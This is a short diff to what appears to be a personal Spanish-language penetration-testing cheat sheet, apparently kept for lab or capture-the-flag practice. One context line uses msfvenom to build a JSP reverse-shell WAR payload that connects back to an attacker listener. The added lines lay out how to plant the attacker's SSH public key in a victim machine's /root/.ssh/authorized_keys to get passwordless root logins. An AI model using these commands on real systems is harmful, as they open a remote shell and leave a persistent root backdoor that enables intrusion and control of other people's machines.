@@ -475,3 +475,14 @@ msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.27 lport=4447 -f war > die
 ****************************************compresores*************************************************************
 extraer
 gunzip access.log.txt.gz
+=============Para conectarse como root a una máquina línux sin contraseña===================
+         kali linux crear un id_rsa
+         ssh-keygen
+         cat ~/.ssh/id_rsa.pub
+         
+         en la máquina víctima
+         mkdir /root/.ssh
+         echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali" > /root/.ssh/authorized_keys
+         
+         Realizar la conexión desde kali
+
